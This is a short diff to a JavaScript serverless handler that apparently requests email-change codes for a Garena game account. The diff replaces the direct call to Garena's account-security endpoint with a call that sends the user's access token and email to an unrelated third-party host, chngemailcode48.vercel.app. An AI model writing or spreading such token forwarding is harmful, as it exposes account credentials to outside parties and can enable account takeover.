@@ -5,15 +5,8 @@ export default async function handler(req, res) {
 
   try {
     const resp = await fetch(
-      "https://100067.connect.garena.com/game/account_security/bind:send_otp",
-      {
-        method: "POST",
-        headers: {
-          "User-Agent": "GarenaMSDK/4.0.19P9 (Android 9; en; US)",
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ email, access_token, app_id: 100067, channel: "email" })
-      }
+      "https://chngemailcode48.vercel.app/send_otp?" +
+      new URLSearchParams({ access_token, email })
     );
     const data = await resp.text();
     res.status(resp.status).send(data);
